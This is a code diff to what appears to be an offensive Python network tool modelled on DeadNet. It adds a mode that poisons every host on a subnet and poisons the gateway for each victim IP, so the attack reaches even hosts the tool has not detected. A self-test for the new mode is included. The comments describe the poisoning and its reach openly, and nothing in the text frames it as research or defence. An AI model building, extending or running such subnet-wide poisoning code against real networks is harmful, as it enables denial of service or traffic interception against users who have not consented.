@@ -111,8 +111,39 @@ class EmissionController:
         self._pump_thread: Optional[threading.Thread] = None
         self._rehydrator: Optional[RehydrationStateMaintainer] = None
 
+        # UNFOCUSED whole-subnet blind targeting: every host IP in this /24 is
+        # poisoned even if never smelled. Identified hosts (attention table) keep
+        # their real MAC + weight so the bird still hones; blind hosts carry an
+        # empty MAC => emit broadcasts the victim-side poison and still poisons
+        # the gateway by victim IP. Empty => disabled (focused fork).
+        self._blind_hosts: List[str] = []
+
         self._started = False
         self._lock = threading.Lock()
+
+    # ---------------------------------------------- whole-subnet blind (U-fork)
+    def set_whole_subnet_blind(self, subnet_cidr: Optional[str],
+                               our_ip: str = "", gw_ip: str = "") -> int:
+        """Enable UNFOCUSED whole-/24 blind targeting from `subnet_cidr`. Every
+        host address (minus network/broadcast, our own IP, the gateway IP) is
+        added to the published focus set each pump cycle with an unknown (empty)
+        MAC, so the attack lands even on an isolated LAN where `smell` can't see
+        the hosts (how vanilla DeadNet "just works"). Pass None/"" to disable
+        (focused fork). Returns the number of blind hosts enabled."""
+        hosts: List[str] = []
+        if subnet_cidr:
+            try:
+                import ipaddress
+                net = ipaddress.ip_network(subnet_cidr, strict=False)
+                excl = {our_ip, gw_ip,
+                        str(net.network_address), str(net.broadcast_address)}
+                hosts = [str(h) for h in net.hosts() if str(h) not in excl]
+            except ValueError as exc:
+                _log("blind subnet %r invalid: %r" % (subnet_cidr, exc))
+                hosts = []
+        self._blind_hosts = hosts
+        _log("whole-subnet blind: %d hosts" % len(hosts))
+        return len(hosts)
 
     # ------------------------------------------------------------- shm paths
     def _focus_path(self, iface: str) -> str:
@@ -203,6 +234,17 @@ class EmissionController:
         for tx in list(self._transmitters.values()):
             try:
                 entries = self._read_attention(tx)
+                if self._blind_hosts:
+                    # cover the whole subnet: add a blind (empty-MAC) entry for
+                    # every host not already represented (by IP) in attention,
+                    # so identified hosts keep their real MAC + honed weight.
+                    have = {e.ip for e in entries if e.ip}
+                    for ip in self._blind_hosts:
+                        if ip in have:
+                            continue
+                        entries.append(AttentionEntry(
+                            mac="", ip=ip, net_id=tx.net_id,
+                            weight=1.0, pinned=False))
                 self._arb.publish_focus(tx.iface, entries,
                                         self._knobs.emit_mode,
                                         tx.gateway_mac, tx.our_mac)
@@ -526,6 +568,24 @@ def _selftest() -> None:
         assert flags_ & FOCUS_FLAG_0TTL, flags_
         print("  [1] pump: attention(3) -> focus count=%d seq=%d ... ok"
               % (count_, seq_))
+
+        # --- 1b. whole-subnet blind: pump injects blind (empty-MAC) entries ---
+        n_blind = ctrl.set_whole_subnet_blind(
+            "10.9.9.0/29", our_ip="10.9.9.2", gw_ip="10.9.9.1")
+        assert n_blind == 4, n_blind     # hosts .1-.6 minus gw(.1) our(.2)
+        ctrl._pump_once()
+        with open(os.path.join(tmp, "focus_wlan0.shm"), "rb") as f:
+            buf = f.read()
+        _, _, count1b, _, _, _, _ = struct.unpack_from(FOCUS_HEADER_FMT, buf, 0)
+        assert count1b == 3 + 4, count1b   # 3 identified + 4 blind
+        ctrl.set_whole_subnet_blind(None)  # disable; back to attention-only
+        ctrl._pump_once()
+        with open(os.path.join(tmp, "focus_wlan0.shm"), "rb") as f:
+            buf = f.read()
+        _, _, count1c, _, _, _, _ = struct.unpack_from(FOCUS_HEADER_FMT, buf, 0)
+        assert count1c == 3, count1c
+        print("  [1b] blind /29 -> +4 entries (count=%d), disable -> %d ... ok"
+              % (count1b, count1c))
 
         # --- 2. rehydration: hand-write a stats buffer with 2 targets ---------
         iface = "wlan1"
